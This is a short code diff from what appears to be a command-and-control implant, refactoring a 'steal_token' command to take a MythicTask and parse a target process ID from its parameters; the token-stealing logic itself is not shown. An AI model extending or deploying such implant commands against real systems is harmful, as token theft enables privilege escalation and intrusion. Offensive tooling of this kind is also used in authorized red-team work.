@@ -9,9 +9,11 @@ namespace Cerberus.Commands
     {
         public override string Name => "steal_token";
 
-        public override string Execute(CerberusTask task)
+        public override string Execute(MythicTask task)
         {
-            if (!int.TryParse(task.Arguments[0], out var pid))
+            var Arguments = task.parameters.Split(' ');
+
+            if (!int.TryParse(Arguments[0], out var pid))
                 return "Failed to parse PID";
 
             // open handle to process
